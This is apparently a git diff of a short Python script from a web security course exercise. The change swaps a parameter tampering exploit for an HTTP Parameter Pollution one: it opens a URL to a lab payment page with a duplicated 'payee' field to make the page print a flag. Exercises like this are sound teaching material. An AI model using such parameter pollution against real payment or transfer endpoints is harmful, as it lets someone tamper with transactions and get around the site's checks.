@@ -1,10 +1,10 @@
 import webbrowser
 
-# Exploit: change GET parameter in the URL to anything that's not
-# 'alice' to get the flag. It's a case of HTTP Requests Parameter Tampering
+# Exploit: add an extra parameter to the GET request and the flag will be 
+# printed. Case of HTTP Parameter Pollution
 
 def main():
-    webbrowser.open('http://wsb.com/Assignment2/case14.php?payee=foo&sum=10', 2)
+    webbrowser.open('http://wsb.com/Assignment2/case14.php?payee=alice&sum=10&payee=bob', 2)
 
 if __name__ == "__main__":
     main()
